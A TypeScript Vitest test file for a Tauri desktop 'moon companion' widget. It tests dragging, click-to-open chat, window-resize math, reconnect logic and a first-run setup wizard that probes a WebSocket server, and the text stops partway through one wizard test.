// @vitest-environment jsdom
import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest'
import * as fs from 'node:fs'
import * as path from 'node:path'

// jsdom never fetches external <script src> tags, so required vendor files
// are loaded by hand, in the same order the page declares them (same
// mechanism as widget-window.test.ts).
function loadVendorInto(target: any, file: string) {
  const src = fs.readFileSync(path.resolve(__dirname, '../frontend/vendor', file), 'utf8')
  new Function('globalThis', src)(target)
}

describe('Luna Moon Companion - Behavioral Driven Tests', () => {
  let mockStartDragging: any
  let mockGetCurrentWindow: any
  let htmlContent: string

  beforeEach(() => {
    // 1. Load index.html content
    const htmlPath = path.resolve(__dirname, '../frontend/index.html')
    htmlContent = fs.readFileSync(htmlPath, 'utf8')

    // 2. Extract and load body HTML structure
    const bodyMatch = htmlContent.match(/<body>([\s\S]*?)<\/body>/)
    const bodyHtml = bodyMatch ? bodyMatch[1] : htmlContent
    document.body.innerHTML = bodyHtml

    // 3. Mock the Tauri native window interface
    mockStartDragging = vi.fn().mockResolvedValue(undefined)
    const mockSetSize = vi.fn().mockResolvedValue(undefined)
    const mockSetAlwaysOnTop = vi.fn().mockResolvedValue(undefined)
    mockGetCurrentWindow = vi.fn().mockReturnValue({
      startDragging: mockStartDragging,
      setSize: mockSetSize,
      setAlwaysOnTop: mockSetAlwaysOnTop,
    })

    class MockLogicalSize {
      type = 'Logical'
      constructor(public width: number, public height: number) {}
    }

    // Attach mock to JSDOM window
    ;(window as any).__TAURI__ = {
      window: {
        getCurrentWindow: mockGetCurrentWindow,
        LogicalSize: MockLogicalSize,
      }
    }
    // Expose mock setSize and setAlwaysOnTop for tests
    ;(window as any).__TAURI__.mockSetSize = mockSetSize
    ;(window as any).__TAURI__.mockSetAlwaysOnTop = mockSetAlwaysOnTop

    // 4. Load the vendor modules the app script uses at definition time
    // (LunaProtocol.PROTOCOL_VERSION, LunaWS.createFrameRegistry), then
    // extract and execute the frontend script to bind event listeners.
    loadVendorInto(window, 'moon-protocol.js')
    loadVendorInto(window, 'moon-ws.js')
    const scriptMatch = htmlContent.match(/<script>([\s\S]*?)<\/script>/)
    const jsCode = scriptMatch ? scriptMatch[1] : ''
    
    // Clean localStorage so persisted-prefs tests don't leak across cases.
    localStorage.clear()

    // Execute JS code inside the JSDOM window context
    const runScript = new Function(jsCode)
    runScript()

    // Enable Vitest fake timers for simulated messaging delays
    vi.useFakeTimers()
  })

  afterEach(() => {
    document.body.innerHTML = ''
    delete (window as any).LunaProtocol
    delete (window as any).LunaWS
    vi.restoreAllMocks()
    vi.useRealTimers()
  })

  // ───────────────────────────────────────────────────────────────────────────
  // Behavioral Feature: Dragging the Moon Widget
  // ───────────────────────────────────────────────────────────────────────────
  describe('Feature: Native Window Dragging', () => {
    it('Scenario: User drags the crescent moon sphere -> Triggers native macOS dragging', () => {
      const moon = document.getElementById('moon')
      expect(moon).not.toBeNull()

      // Dispatch mousedown/pointerdown to simulate grabbing the moon
      const pointerDownEvent = new MouseEvent('pointerdown', {
        bubbles: true,
        clientX: 100,
        clientY: 100,
        buttons: 1, // Primary click
      })
      moon!.dispatchEvent(pointerDownEvent)

      // Verification: The programmatic drag method MUST be called exactly once
      expect(mockGetCurrentWindow).toHaveBeenCalled()
      expect(mockStartDragging).toHaveBeenCalledTimes(1)
    })
  })

  // ───────────────────────────────────────────────────────────────────────────
  // Behavioral Feature: Moon click → chat widget (Phase 4/6). The moon is the
  // chat's LAUNCHER now: a quick click summons the chat widget window via the
  // Rust open_widget command. Press/click discrimination still gates it — a
  // long press or a drag must never spawn a window.
  // ───────────────────────────────────────────────────────────────────────────
  describe('Feature: Moon click summons the chat widget', () => {
    const click = (down: [number, number], up: [number, number], holdMs = 50) => {
      const moon = document.getElementById('moon')!
      moon.dispatchEvent(new MouseEvent('pointerdown', { bubbles: true, clientX: down[0], clientY: down[1] }))
      vi.advanceTimersByTime(holdMs)
      moon.dispatchEvent(new MouseEvent('pointerup', { bubbles: true, clientX: up[0], clientY: up[1] }))
    }

    it('Scenario: a quick click invokes open_widget({kind: "chat"})', async () => {
      const invoke = vi.fn(async () => 'panel-chat')
      ;(window as any).__TAURI__.core = { invoke }
      click([100, 100], [100, 100])
      await vi.waitFor(() => expect(invoke).toHaveBeenCalledWith('open_widget', { kind: 'chat' }))
    })

    it('Scenario: a long press (≥280ms) is a grab, not a click — no widget spawn', () => {
      const invoke = vi.fn(async () => 'panel-chat')
      ;(window as any).__TAURI__.core = { invoke }
      click([100, 100], [100, 100], 400)
      expect(invoke).not.toHaveBeenCalled()
    })

    it('Scenario: a press that moved ≥5px is a drag, not a click — no widget spawn', () => {
      const invoke = vi.fn(async () => 'panel-chat')
      ;(window as any).__TAURI__.core = { invoke }
      click([100, 100], [140, 130])
      expect(invoke).not.toHaveBeenCalled()
    })

    it('Scenario: off-Tauri (no core) a click logs and no-ops instead of throwing', () => {
      // The shared beforeEach mocks __TAURI__.window only — no core, exactly
      // the frontend-dev/jsdom case. The old in-envelope toggleChat fallback
      // died in Phase 6.
      expect(() => click([100, 100], [100, 100])).not.toThrow()
    })
  })

  // ───────────────────────────────────────────────────────────────────────────
  // Feature: Visual DOM Structure Snapshots
  // ───────────────────────────────────────────────────────────────────────────
  describe('Feature: Visual DOM Structure Snapshots', () => {
    // Snapshot the structural DOM only — elide the inline <script> body. These
    // assert "visual structure", but document.body.innerHTML also contains the
    // entire app script, so any JS edit would spuriously break them. Stripping
    // the script source keeps them a real structure check, not a "source
    // unchanged" tripwire. (Phase 6: the hub has ONE state now — moon + wizard
    // markup; the old open-chat snapshot died with the in-envelope chat.)
    const structuralDom = (html: string) =>
      html.replace(/(<script\b[^>]*>)[\s\S]*?(<\/script>)/gi, '$1/* elided for snapshot */$2')

    it('Scenario: Hub structure (moon + string + wizard) matches the design pattern', () => {
      expect(structuralDom(document.body.innerHTML)).toMatchSnapshot()
    })
  })

  // ───────────────────────────────────────────────────────────────────────────
  // Feature: Capability & Permissions Configuration Verification
  // ───────────────────────────────────────────────────────────────────────────
  describe('Feature: Tauri Capability & Configuration', () => {
    it('Scenario: Capability default.json includes required window permissions', () => {
      const capPath = path.resolve(__dirname, '../src-tauri/capabilities/default.json')
      const capContent = fs.readFileSync(capPath, 'utf8')
      const cap = JSON.parse(capContent)
      
      expect(cap.permissions).toContain('core:window:default')
      expect(cap.permissions).toContain('core:window:allow-set-size')
      expect(cap.permissions).toContain('core:window:allow-start-dragging')
      expect(cap.permissions).toContain('core:window:allow-set-always-on-top')
    })

    it('Scenario: Tauri configuration settings protect transparency and resizability', () => {
      const configPath = path.resolve(__dirname, '../src-tauri/tauri.conf.json')
      const configContent = fs.readFileSync(configPath, 'utf8')
      const config = JSON.parse(configContent)
      
      const windowConfig = config.app?.windows?.[0]
      expect(windowConfig).toBeDefined()
      expect(windowConfig.transparent).toBe(true)
      expect(windowConfig.resizable).toBe(true)
      expect(windowConfig.decorations).toBe(false)
    })
  })

  // ───────────────────────────────────────────────────────────────────────────
  // Feature: single-thread controls — the "+ new chat" satellite stays gone and
  // the fresh-thread reset moved to the General panel: test/panel-general.test.ts.
  // ───────────────────────────────────────────────────────────────────────────

  // ───────────────────────────────────────────────────────────────────────────
  // Feature: re-tether swing envelope. The window grows + re-origins so the moon
  // stays visually fixed while the bead gets room to fling. The Tauri window
  // calls are operator-verify; here we pin the COORDINATE MATH (incl. Retina
  // logical-px + screen-edge clamp + moon-CSS compensation) with a mocked window.
  // ───────────────────────────────────────────────────────────────────────────
  describe('Feature: re-tether swing envelope (window math)', () => {
    const M = () => (window as any).__MoonInternals
    const mockWin = (originX: number, originY: number, sf = 1) => {
      const setPosition = vi.fn().mockResolvedValue(undefined)
      const setSize = vi.fn().mockResolvedValue(undefined)
      const win = {
        scaleFactor: vi.fn().mockResolvedValue(sf),
        outerPosition: vi.fn().mockResolvedValue({ toLogical: () => ({ x: originX, y: originY }) }),
        currentMonitor: vi.fn().mockResolvedValue({
          position: { toLogical: () => ({ x: 0, y: 0 }) },
          size: { toLogical: () => ({ width: 1440, height: 900 }) },
        }),
        setPosition, setSize,
      }
      ;(window as any).__TAURI__.window.getCurrentWindow = () => win
      ;(window as any).__TAURI__.window.LogicalPosition = class { x: number; y: number; constructor(x: number, y: number) { this.x = x; this.y = y } }
      return { setPosition, setSize }
    }

    it('Scenario: growToEnvelope keeps the moon visually fixed (origin shift cancels the moon re-center)', async () => {
      const { setPosition, setSize } = mockWin(300, 200)
      await M().TauriService.growToEnvelope()
      const moon = document.getElementById('moon')!
      const pos = setPosition.mock.calls[0][0]
      // moon screen = (315,215); envelope centres the moon at window-local (175,15)
      expect({ x: pos.x, y: pos.y }).toEqual({ x: 140, y: 200 }) // 315-175, 215-15
      expect(moon.style.left).toBe('175px')
      expect(moon.style.top).toBe('15px')
      // THE invariant: newOrigin + moonCss === old moon screen position (no jump)
      expect(pos.x + parseFloat(moon.style.left)).toBe(315)
      expect(pos.y + parseFloat(moon.style.top)).toBe(215)
      expect(setSize).toHaveBeenCalledWith(expect.objectContaining({ width: 460, height: 470 }))
      expect(document.body.classList.contains('retethering')).toBe(true)
    })

    it('Scenario: a moon jammed at the screen edge clamps on-screen and compensates the moon CSS', async () => {
      const { setPosition } = mockWin(5, 200) // near the left edge
      await M().TauriService.growToEnvelope()
      const moon = document.getElementById('moon')!
      const pos = setPosition.mock.calls[0][0]
      // moon screen = (20,215); desired origin 20-175=-155 → clamped to 0; moon CSS compensates to 20
      expect(pos.x).toBe(0)
      expect(parseFloat(moon.style.left)).toBe(20)
      expect(pos.x + parseFloat(moon.style.left)).toBe(20) // screen position still preserved
    })

    it('Scenario: restoreCollapsed returns the moon to 140x185 at its original screen spot', async () => {
      // First grow (moon at screen 315,215 → envelope), then restore.
      mockWin(300, 200)
      await M().TauriService.growToEnvelope()
      const moon = document.getElementById('moon')!
      // After grow, window origin is (140,200) and moon CSS (175,15) → screen (315,215).
      const { setPosition, setSize } = mockWin(140, 200) // outerPosition now reports the grown origin
      // re-point the moon CSS to what grow left it as (mockWin doesn't touch the DOM)
      moon.style.left = '175px'; moon.style.top = '15px'
      await M().TauriService.restoreCollapsed()
      const pos = setPosition.mock.calls[0][0]
      // moon screen still (315,215); collapsed moon CSS = (15,15) → origin (300,200)
      expect({ x: pos.x, y: pos.y }).toEqual({ x: 300, y: 200 })
      expect(moon.style.left).toBe('') // back to CSS default 15
      expect(setSize).toHaveBeenCalledWith(expect.objectContaining({ width: 140, height: 185 }))
      expect(document.body.classList.contains('retethering')).toBe(false)
    })
  })

  // ───────────────────────────────────────────────────────────────────────────
  // Feature: re-tether state machine. Drives the string from the connection
  // lifecycle: pull → reconnect NOW (the hub is hello-only since Phase 4 — no
  // thread to re-subscribe); detached-past-grace → drop the string; hello on
  // the new socket → retract + restore.
  // ───────────────────────────────────────────────────────────────────────────
  describe('Feature: re-tether state machine', () => {
    const M = () => (window as any).__MoonInternals

    it('Scenario: pull with the socket DOWN bypasses backoff, cancels the pending reconnect, and connects', () => {
      const m = M()
      m.State.ws = null
      m.State.reconnectAttempts = 5
      m.State.reconnectTimer = 123 // a pending scheduleReconnect timer
      const connect = vi.spyOn(m.WebSocketEngine, 'connect').mockImplementation(() => {})
      m.WebSocketEngine.reTether()
      expect(m.State.reconnectAttempts).toBe(0)
      expect(connect).toHaveBeenCalledTimes(1)
      expect(m.State.reconnectTimer).toBeNull() // no orphaned second socket
    })

    it('Scenario: pull with the socket OPEN reconnects too — the hub never re-subscribes a thread', () => {
      const m = M()
      m.State.ws = { readyState: WebSocket.OPEN, send: vi.fn() }
      const send = vi.spyOn(m.WebSocketEngine, 'send').mockImplementation(() => {})
      const connect = vi.spyOn(m.WebSocketEngine, 'connect').mockImplementation(() => {})
      m.WebSocketEngine.reTether()
      expect(connect).toHaveBeenCalledTimes(1)
      expect(send).not.toHaveBeenCalled() // no subscribe / list-threads / new-thread
    })

    it('Scenario: showTether drops the string (grow envelope → show)', async () => {
      const m = M()
      vi.spyOn(m.MoonString, 'isLive').mockReturnValue(false)
      const grow = vi.spyOn(m.TauriService, 'growToEnvelope').mockResolvedValue(undefined)
      const show = vi.spyOn(m.MoonString, 'show').mockImplementation(() => {})
      m.WebSocketEngine.showTether()
      expect(grow).toHaveBeenCalledTimes(1)
      await Promise.resolve(); await Promise.resolve() // flush the .then(show)
      expect(show).toHaveBeenCalledTimes(1)
      expect(m.State.tetherPendingOnCollapse).toBe(false)
    })

    it('Scenario: a reconnect landing mid-grow abandons the string AND restores the window (tetherGen epoch)', async () => {
      const m = M()
      vi.spyOn(m.MoonString, 'isLive').mockReturnValue(false)
      // growToEnvelope() resolves only when WE say so — this models the several-IPC
      // round-trip gap during which a background reconnect can succeed.
      let resolveGrow: () => void = () => {}
      const grow = vi
        .spyOn(m.TauriService, 'growToEnvelope')
        .mockReturnValue(new Promise<void>((r) => { resolveGrow = r }))
      const restore = vi.spyOn(m.TauriService, 'restoreCollapsed').mockResolvedValue(undefined)
      const show = vi.spyOn(m.MoonString, 'show').mockImplementation(() => {})

      m.WebSocketEngine.showTether()          // arms the grow, stamps tetherGen
      expect(grow).toHaveBeenCalledTimes(1)

      // reconnect wins the race. onReattached suspends at `await growPromise`, so it
      // must NOT be awaited before we resolve the grow (that would deadlock).
      const reattached = m.WebSocketEngine.onReattached()
      expect(restore).not.toHaveBeenCalled()  // restore is sequenced AFTER the grow settles
      resolveGrow()                           // grow finishes a beat too late
      await reattached                         // → grow settled → restore awaited
      expect(show).not.toHaveBeenCalled()     // string abandoned, not popped out post-reconnect
      expect(restore).toHaveBeenCalledTimes(1) // ...and the window was collapsed back (no orphan)
    })

    it('Scenario: a NEW tether episode during cleanup is not clobbered (epoch guards the restore)', async () => {
      const m = M()
      vi.spyOn(m.MoonString, 'isLive').mockReturnValue(false)
      vi.spyOn(m.MoonString, 'show').mockImplementation(() => {})
      let resolveGrow1: () => void = () => {}
      vi.spyOn(m.TauriService, 'growToEnvelope')
        .mockReturnValueOnce(new Promise<void>((r) => { resolveGrow1 = r })) // episode 1 (pending)
        .mockReturnValue(Promise.resolve())                                  // episode 2 grow
      const restore = vi.spyOn(m.TauriService, 'restoreCollapsed').mockResolvedValue(undefined)

      m.WebSocketEngine.showTether()           // episode 1 grow (pending)
      const reattached = m.WebSocketEngine.onReattached() // suspends awaiting episode-1 grow
      m.WebSocketEngine.showTether()           // a fresh disconnect → episode 2 → bumps tetherGen
      resolveGrow1()                           // episode-1 grow finally settles
      await reattached
      expect(restore).not.toHaveBeenCalled()   // episode 1's restore stood down; episode 2 owns the window
    })

    it('Scenario: a hello on the reconnected socket retracts a live string (with pulse) and clears the grace timer', () => {
      const m = M()
      ;(window as any).__TAURI__.core = { invoke: vi.fn().mockResolvedValue(undefined) }
      m.State.ws = { readyState: WebSocket.OPEN, send: vi.fn() }
      m.State.tetherGraceTimer = 999
      vi.spyOn(m.MoonString, 'isLive').mockReturnValue(true)
      const retract = vi.spyOn(m.MoonString, 'retract').mockImplementation(() => {})
      m.handleFrame({ type: 'hello', protocolVersion: 2 })
      expect(retract).toHaveBeenCalledWith(true)
      expect(m.State.tetherGraceTimer).toBeNull()
      expect(m.State.connStatus).toBe('connected')
    })

    it('Scenario: a PULL wraps the string into the moon IMMEDIATELY — retract fires before any hello', () => {
      const m = M()
      m.State.growPromise = Promise.resolve()  // the showTether grow that put the string out
      vi.spyOn(m.WebSocketEngine, 'connect').mockImplementation(() => {})
      vi.spyOn(m.MoonString, 'isLive').mockReturnValue(true)
      const retract = vi.spyOn(m.MoonString, 'retract').mockImplementation(() => {})
      m.WebSocketEngine.reTether()             // the pull gesture — NO hello has arrived
      expect(retract).toHaveBeenCalledWith(true)
      // The retract's onRetracted hook owns the window restore now; the stashed
      // grow promise must be dropped or onReattached would restore a second time.
      expect(m.State.growPromise).toBeNull()
    })

    it('Scenario: after a pull-retract has finished, onReattached is just the status flip (no second restore, no second retract)', async () => {
      const m = M()
      m.State.growPromise = null               // reTether dropped it at pull time
      vi.spyOn(m.MoonString, 'isLive').mockReturnValue(false) // retract already finished
      const retract = vi.spyOn(m.MoonString, 'retract').mockImplementation(() => {})
      const restore = vi.spyOn(m.TauriService, 'restoreCollapsed').mockResolvedValue(undefined)
      await m.WebSocketEngine.onReattached()
      expect(retract).not.toHaveBeenCalled()
      expect(restore).not.toHaveBeenCalled()   // onRetracted already collapsed the window
      expect(m.State.connStatus).toBe('connected')
    })
  })

  // ── Window-drag rope physics + click-through region ───────────────────────
  // Dragging the WINDOW fires no JS pointer events (native drag), so onMoved
  // deltas are injected into the rope as apparent velocity; and while the
  // string is live the webview publishes the clickable region (moon + rope)
  // so the Rust cursor poll can make the empty envelope click-through.
  // jsdom can't run the rAF loop or the Rust poll — these test the contracts:
  // the velocity-injection math and the region-publish lifecycle.
  // ⏸️ The three rope-physics scenarios are SKIPPED while the tether bead is
  // disabled (#110: show() early-returns until it is properly gated on actual
  // disconnection). The machinery they cover is intact but dormant — un-skip
  // them in the same commit that removes the early return from show().
  describe('Feature: window-drag rope physics + click-through region', () => {
    const M = () => (window as any).__MoonInternals

    beforeEach(() => {
      // No-op rAF: these tests call the REAL MoonString.show(), whose loop
      // re-arms rAF every frame — the SYNCHRONOUS rAF leaked by the frame-
      // pipeline suite would recurse it into a stack overflow. A no-op also
      // freezes the physics, so points move ONLY via the injection under test.
      ;(window as any).requestAnimationFrame = () => 0
      ;(window as any).cancelAnimationFrame = () => {}
    })

    function stubInvoke() {
      const invoke = vi.fn().mockResolvedValue(undefined)
      ;(window as any).__TAURI__.core = { invoke }
      return invoke
    }

    it.skip('Scenario: a window move shifts FREE points as velocity (positions move, prev-positions stay, anchor pinned)', () => {
      const m = M()
      stubInvoke()
      m.MoonString.show()
      const before = m.MoonString.getPoints()
      expect(before.length).toBeGreaterThan(2)

      m.MoonString.injectWindowDelta(50, 20)   // window dragged +50,+20 logical px

      const after = m.MoonString.getPoints()
      // Anchor (i=0) stays pinned to the moon — never shifted by the inject.
      expect(after[0].x).toBe(before[0].x)
      expect(after[0].y).toBe(before[0].y)
      for (let i = 1; i < after.length; i++) {
        // Free points trail the window: position shifts opposite the delta...
        expect(after[i].x - before[i].x).toBeCloseTo(-50, 5)
        expect(after[i].y - before[i].y).toBeCloseTo(-20, 5)
        // ...but prev-positions DON'T move, which is what makes Verlet read the
        // shift as velocity (the swing) instead of a teleport.
        expect(after[i].px).toBe(before[i].px)
        expect(after[i].py).toBe(before[i].py)
      }
    })

    it.skip('Scenario: per-event delta is clamped (a coalesced full-screen jump injects a swing, not an explosion)', () => {
      const m = M()
      stubInvoke()
      m.MoonString.show()
      const before = m.MoonString.getPoints()
      m.MoonString.injectWindowDelta(1200, -900)  // e.g. paint frozen during drag → one fat delta
      const after = m.MoonString.getPoints()
      expect(after[1].x - before[1].x).toBeCloseTo(-80, 5)  // clamped to ±80
      expect(after[1].y - before[1].y).toBeCloseTo(80, 5)
    })

    it('Scenario: injection is a no-op when the string is not live', () => {
      const m = M()
      stubInvoke()
      m.MoonString.show()
      m.MoonString.hideImmediate()             // live=false, points remain
      const before = m.MoonString.getPoints()
      m.MoonString.injectWindowDelta(50, 50)
      expect(m.MoonString.getPoints()).toEqual(before)
    })

    it.skip('Scenario: show() publishes the interactive region; hideImmediate() clears it', () => {
      const m = M()
      const invoke = stubInvoke()
      m.MoonString.show()
      const enable = invoke.mock.calls.find((c: any[]) => c[0] === 'set_interactive_region')
      expect(enable).toBeTruthy()
      expect(enable![1].enabled).toBe(true)
      expect(enable![1].rects).toHaveLength(2)            // moon rect + rope bbox
      for (const r of enable![1].rects) expect(r).toHaveLength(4)

      invoke.mockClear()
      m.MoonString.hideImmediate()
      const disable = invoke.mock.calls.find((c: any[]) => c[0] === 'set_interactive_region')
      expect(disable).toBeTruthy()
      expect(disable![1].enabled).toBe(false)              // whole window interactive again
    })
  })

  // ───────────────────────────────────────────────────────────────────────────
  // Behavioral Feature: Setup wizard (first-run installer)
  // ───────────────────────────────────────────────────────────────────────────
  describe('Feature: Setup wizard (first-run installer)', () => {
    const M = () => (window as any).__MoonInternals
    const W = () => M().SetupWizard
    const panel = () => document.getElementById('setup-wizard')!
    const activeStep = () =>
      (panel().querySelector('.wizard-step.active') as HTMLElement)?.dataset.step

    function stubCore(handler: (cmd: string, args: any) => any) {
      const invoke = vi.fn().mockImplementation((cmd: string, args: any) =>
        Promise.resolve(handler(cmd, args)))
      ;(window as any).__TAURI__.core = { invoke }
      return invoke
    }

    it('Scenario: first run (no stored connection) -> wizard auto-opens', async () => {
      stubCore((cmd) => (cmd === 'load_connection' ? {} : undefined))
      await W().maybeAutoOpen()
      expect(panel().classList.contains('active')).toBe(true)
      expect(activeStep()).toBe('welcome')
    })

    it('Scenario: a connection already exists -> wizard stays closed and marks setup complete', async () => {
      stubCore((cmd) => (cmd === 'load_connection' ? { wsUrl: 'ws://10.0.0.5:4753/ui' } : undefined))
      await W().maybeAutoOpen()
      expect(panel().classList.contains('active')).toBe(false)
      expect(localStorage.getItem('luna.moon.setupComplete')).toBe('1')
    })

    it('Scenario: setup already completed once -> never auto-opens again', async () => {
      localStorage.setItem('luna.moon.setupComplete', '1')
      const invoke = stubCore(() => ({}))
      await W().maybeAutoOpen()
      expect(panel().classList.contains('active')).toBe(false)
      expect(invoke).not.toHaveBeenCalled()   // short-circuits before any IPC
    })

    it('Scenario: outside a real Tauri runtime (no __TAURI__.core) -> auto-open is inert', async () => {
      await W().maybeAutoOpen()               // shared beforeEach mocks window only, no .core
      expect(panel().classList.contains('active')).toBe(false)
    })

    it('Scenario: opening the wizard ENDS a live tether episode — buttons stay clickable (regression)', async () => {
      // First run is always disconnected, so the string episode is the COMMON
      // first-run state: it flips everything outside the moon+rope rects
      // native-click-through. If the wizard opens without tearing it down,
      // every wizard button paints fine and is dead to real clicks.
      stubCore(() => undefined)
      let live = false
      vi.spyOn(M().MoonString, 'isLive').mockImplementation(() => live)
      const show = vi.spyOn(M().MoonString, 'show').mockImplementation(() => { live = true })
      const hide = vi.spyOn(M().MoonString, 'hideImmediate').mockImplementation(() => { live = false })
      vi.spyOn(M().TauriService, 'growToEnvelope').mockResolvedValue(undefined)
      const restore = vi.spyOn(M().TauriService, 'restoreCollapsed').mockResolvedValue(undefined)

      M().WebSocketEngine.showTether()         // string drops while collapsed
      await Promise.resolve(); await Promise.resolve()
      expect(show).toHaveBeenCalledTimes(1)    // episode live → region owns the window

      await W().open()
      expect(hide).toHaveBeenCalledTimes(1)    // hideImmediate cleared the click-through region
      expect(restore).toHaveBeenCalledTimes(1) // envelope restored before the wizard resize
      expect(M().State.growPromise).toBeNull() // episode bookkeeping fully cleared
      expect(M().State.tetherPendingOnCollapse).toBe(true) // string returns after the wizard
      expect(panel().classList.contains('active')).toBe(true)
    })

    it('Scenario: a disconnect while the wizard is open DEFERS the string drop (no click-through under the wizard)', async () => {
      stubCore(() => undefined)
      const show = vi.spyOn(M().MoonString, 'show').mockImplementation(() => {})
      const grow = vi.spyOn(M().TauriService, 'growToEnvelope').mockResolvedValue(undefined)
      await W().open()
      M().WebSocketEngine.showTether()         // grace timer fires mid-wizard
      await Promise.resolve(); await Promise.resolve()
      expect(grow).not.toHaveBeenCalled()      // no envelope grow under the wizard
      expect(show).not.toHaveBeenCalled()
      expect(M().State.tetherPendingOnCollapse).toBe(true)
    })

    it('Scenario: closing the wizard hands the window to a deferred string instead of a plain collapse', async () => {
      stubCore(() => undefined)
      const showTether = vi.spyOn(M().WebSocketEngine, 'showTether').mockImplementation(() => {})
      await W().open()                          // collapsed → _openedMinimized = true
      M().State.tetherPendingOnCollapse = true  // a drop was deferred meanwhile
      W().close({ complete: true })
      vi.advanceTimersByTime(250)
      expect(showTether).toHaveBeenCalledTimes(1)
    })

    it('Scenario: Begin -> path step; picking each card routes to its flow; closing marks complete', () => {
      stubCore(() => undefined)
      W().open()
      document.getElementById('wizard-begin')!.click()
      expect(activeStep()).toBe('path')

      ;(panel().querySelector('[data-path="local"]') as HTMLElement).click()
      expect(activeStep()).toBe('local')
      document.getElementById('wizard-local-back')!.click()

      ;(panel().querySelector('[data-path="remote"]') as HTMLElement).click()
      expect(activeStep()).toBe('remote')
      document.getElementById('wizard-remote-back')!.click()

      ;(panel().querySelector('[data-path="connect"]') as HTMLElement).click()
      expect(activeStep()).toBe('connect')

      document.getElementById('wizard-close-x')!.click()
      expect(panel().classList.contains('active')).toBe(false)
      expect(localStorage.getItem('luna.moon.setupComplete')).toBe('1')
    })

    it('Scenario: progress beads track the journey (path=1, config=2, connect=3, done=4)', () => {
      stubCore(() => undefined)
      W().open()
      const beads = () => Array.from(panel().querySelectorAll('.wizard-bead'))
      expect(beads()[0].classList.contains('active')).toBe(true)
      W().goTo('path')
      expect(beads()[1].classList.contains('active')).toBe(true)
      expect(beads()[0].classList.contains('done')).toBe(true)
      W().goTo('local')
      expect(beads()[2].classList.contains('active')).toBe(true)
      W().goTo('connect')
      expect(beads()[3].classList.contains('active')).toBe(true)
      W().goTo('done')
      expect(beads()[4].classList.contains('active')).toBe(true)
      expect(beads().slice(0, 4).every((b) => b.classList.contains('done'))).toBe(true)
    })

    it('Scenario: connect test hears the hello frame -> success status with build identity', async () => {
      const sockets: any[] = []
      class FakeWS {
        url: string
        onmessage: any; onclose: any; onerror: any
        constructor(url: string) { this.url = url; sockets.push(this) }
        close() {}
      }
      ;(window as any).WebSocket = FakeWS

      W().open()
      W().chosenPath = 'connect'
      W().goTo('connect')
      const urlInput = document.getElementById('wizard-connect-url') as HTMLInputElement
      const tokenInput = document.getElementById('wizard-connect-token') as HTMLInputElement
      urlInput.value = 'ws://moonbase:4753/ui'
      tokenInput.value = 'sekrit'

      const testPromise = W().runConnectTest()
      await Promise.resolve()
      expect(sockets).toHaveLength(1)
      // The probe carries the token as a query param, like the real engine.
      expect(sockets[0].url).toBe('ws://moonbase:4753/ui?token=sekrit')

      sockets[0].onmessage({ data: JSON.stringify({ type: 'hello', protocolVersion: 2, buildSha: 'abc1234' }) })
      const ok = await testPromise
      expect(ok).toBe(true)
      const status = document.getElementById('wizard-connect-status')!
      expect(status.textContent).toContain('Found Luna')
      expect(status.textContent).toContain('abc1234')
      expect(status.classList.contains('ok')).toBe(true)
    })

    it('Scenario: connect test refused (socket closes) -> failure status, finish still possible', async () => {
      const sockets: any[] = []
      class FakeWS {
        onmessage: any; onclose: any; onerror: any
        constructor(_url: string) { sockets.push(this) }
        close() {}
      }
      ;(window as any).WebSocket = FakeWS

      W().open()
      ;(document.getElementById('wizard-connect-url') as HTMLInputElement).value = 'ws://nowhere:4753/ui'
      const testPromise = W().runConnectTest()
      await Promise.resolve()
      sockets[0].onclose({ code: 1006 })
      const ok = await testPromise
      expect(ok).toBe(false)
      const status = document.getElementById('wizard-connect-status')!
      expect(status.classList.contains('fail')).toBe(true)
    })

    function fakeWsClass(sockets: any[]) {
      return class FakeWS {
        url: string
        onmessage: any; onclose: any; onerror: any; onopen: any
        readyState = 0
        constructor(url: string) { this.url = url; sockets.push(this) }
        close() {}
        send() {}
        addEventListener() {}      // WebSocketEngine.connect wires via listeners
        removeEventListener() {}
      }
    }

    it('Scenario: Save & finish verifies the hello FIRST, then persists, reconnects, and celebrates', async () => {
      const sockets: any[] = []
      ;(window as any).WebSocket = fakeWsClass(sockets)
      const invoke = stubCore(() => undefined)

      W().open()
      ;(document.getElementById('wizard-connect-url') as HTMLInputElement).value = 'ws://moonbase:4753/ui'
      ;(document.getElementById('wizard-connect-token') as HTMLInputElement).value = 'sekrit'

      const pending = W().finish()
      // Nothing persisted yet — the probe is still listening.
      expect(invoke.mock.calls.find((c: any[]) => c[0] === 'save_connection')).toBeFalsy()
      sockets[0].onmessage({ data: JSON.stringify({ type: 'hello', protocolVersion: 2 }) })
      await pending

      const saved = invoke.mock.calls.find((c: any[]) => c[0] === 'save_connection')
      expect(saved).toBeTruthy()
      expect(saved![1]).toEqual({ url: 'ws://moonbase:4753/ui', token: 'sekrit' })
      expect(M().State.wsUrl).toBe('ws://moonbase:4753/ui')
      expect(M().State.wsToken).toBe('sekrit')
      expect(localStorage.getItem('luna_ws_url')).toBe('ws://moonbase:4753/ui')
      expect(localStorage.getItem('luna.moon.setupComplete')).toBe('1')
      expect(activeStep()).toBe('done')
    })

    it('Scenario: a setup-mode server surfaces the Claude-login note on the done step', async () => {
      const sockets: any[] = []
      ;(window as any).WebSocket = fakeWsClass(sockets)
      stubCore(() => undefined)

      W().open()
      W().goTo('connect')
      ;(document.getElementById('wizard-connect-url') as HTMLInputElement).value = 'ws://127.0.0.1:4753/ui'

      const pending = W().finish()
      sockets[0].onmessage({ data: JSON.stringify({
        type: 'hello', protocolVersion: 2,
        capabilities: { chat: false, setup: true },
      }) })
      await pending

      expect(activeStep()).toBe('done')
      const note = document.getElementById('wizard-done-setup') as HTMLElement
      expect(note.hidden).toBe(false)
      expect(note.textContent).toContain('claude setup-token')
      expect(document.getElementById('wizard-done-title')!.textContent).toContain('one last step')
    })

    it('Scenario: a chat-ready server keeps the done step clean (no setup note)', async () => {
      const sockets: any[] = []
      ;(window as any).WebSocket = fakeWsClass(sockets)
      stubCore(() => undefined)

      W().open()
      W().goTo('connect')
      ;(document.getElementById('wizard-connect-url') as HTMLInputElement).value = 'ws://127.0.0.1:4753/ui'

      const pending = W().finish()
      sockets[0].onmessage({ data: JSON.stringify({
        type: 'hello', protocolVersion: 2,
        capabilities: { chat: true, setup: false },
      }) })
      await pending

      expect(activeStep()).toBe('done')
      expect((document.getElementById('wizard-done-setup') as HTMLElement).hidden).toBe(true)
      expect(document.getElementById('wizard-done-title')!.textContent).toBe('Luna is tethered')
    })

    it('Scenario: failed probe blocks the save; the button re-arms as an explicit "Save anyway"', async () => {
      const sockets: any[] = []
